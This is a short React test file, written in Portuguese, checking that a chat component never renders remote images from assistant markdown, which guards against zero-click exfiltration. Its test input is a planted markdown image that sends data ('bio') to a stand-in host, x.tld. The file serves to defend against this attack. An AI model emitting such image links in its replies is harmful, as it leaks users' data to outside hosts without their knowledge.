/** MensagemItem: assistant markdown must never load a remote image (zero-click exfiltration). */
import * as rtl from "@testing-library/react";
import { MemoryRouter } from "react-router-dom";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { afterEach, describe, expect, it } from "vitest";

import { MensagemItem } from "./MensagemItem";

afterEach(() => rtl.cleanup());

describe("MensagemItem — imagens remotas", () => {
  it("imagem remota plantada na resposta do modelo nunca vira <img>", () => {
    const { container } = rtl.render(
      <QueryClientProvider client={new QueryClient()}>
        <MemoryRouter>
          <MensagemItem role="assistant" conteudo={"Oi ![x](https://x.tld/?d=bio)"} />
        </MemoryRouter>
      </QueryClientProvider>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("x.tld");
  });
});
